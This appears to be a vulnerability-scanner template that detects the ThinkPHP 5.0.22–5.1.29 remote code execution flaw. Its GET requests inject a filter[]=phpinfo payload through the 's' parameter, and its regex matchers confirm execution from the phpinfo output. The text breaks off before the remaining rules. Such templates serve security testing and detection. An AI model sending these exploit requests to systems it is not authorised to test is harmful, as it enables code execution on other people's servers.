expression: r0() || r1() || r00() || r11() || r000() || r111()
id: thinkphp-5024-5130-rce
info:
  author: lark-lab
  description: A vulnerability in ThinkPHP allows remote unauthenticated attackers
    to cause the product to execute arbitrary code via the 's' parameter.
  name: ThinkPHP 5.0.22 TO 5.1.29  RCE
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=index/\think\Request/input&filter[]=phpinfo&data=-1
  r00:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=admin/\think\Request/input&filter[]=phpinfo&data=-1
  r000:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=api/\think\Request/input&filter[]=phpinfo&data=-1
  r1:
